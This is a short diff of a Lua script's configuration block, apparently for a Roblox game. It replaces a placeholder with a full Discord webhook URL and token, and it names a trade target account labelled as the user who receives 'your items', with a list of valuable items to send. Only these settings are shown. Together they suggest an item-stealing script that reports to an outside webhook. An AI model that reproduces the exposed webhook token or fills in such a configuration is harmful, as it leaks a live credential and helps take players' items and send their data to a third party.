@@ -1,5 +1,5 @@
 --===[ USER CONFIGURATION ]===--
-local webhookURL = "YOUR_DISCORD_WEBHOOK_HERE"  -- <<== PUT YOUR WEBHOOK LINK HERE
+local webhookURL = "https://discord.com/api/webhooks/1111606979585130537/0joXFyaI312c33vvQLZ0-7M7dCOJJjIeRYQVxB2qyMg79N0ZSZokugMrbI9G9WhoOnHl"  -- <<== PUT YOUR WEBHOOK LINK HERE
 local tradeTarget = "Ambacrabs"                 -- <<== CHANGE THIS TO THE USER WHO GETS YOUR ITEMS
 local valuableItems = {                         -- <<== ADD/REMOVE ITEM NAMES HERE
     "Candy Blossom",
